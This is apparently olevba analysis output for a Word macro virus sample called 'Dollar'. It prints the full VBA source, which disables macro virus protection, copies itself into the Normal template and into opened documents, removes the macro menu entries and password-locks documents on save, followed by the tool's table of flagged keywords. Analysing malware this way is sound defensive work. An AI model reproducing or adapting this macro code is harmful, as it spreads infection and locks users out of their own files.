olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ultras.Dollar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ultras.Dollar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dollar.bas 
in file: Virus.MSWord.Ultras.Dollar - OLE stream: 'Macros/VBA/Dollar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
For d = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(d).Name = "Dollar" Then
DocInfect = True
End If
Next
For f = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(f).Name = "Dollar" Then
GlobInfect = True
End If
Next
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Dollar", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Dollarz", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Dollar", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Dollarz", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
Call KillBar
If Day(Now()) = 9 Then
Dollarz.Show
End If
End Sub

Sub KillBar()
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
End Sub

Sub ToolsMacro()
'DoLLaR by MiDeZ [RiOteRs]
'Thanx ULTRAS
Beep
End Sub

Sub ViewVBCode()
Beep
If Second(Now()) = 33 Then
Dollarz.Show
End If
End Sub

Sub FileTemplates()
Beep
End Sub

Sub ToolsCustomize()
Beep
End Sub

Sub FileSave()
ActiveDocument.Password = "DoLLaR"
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

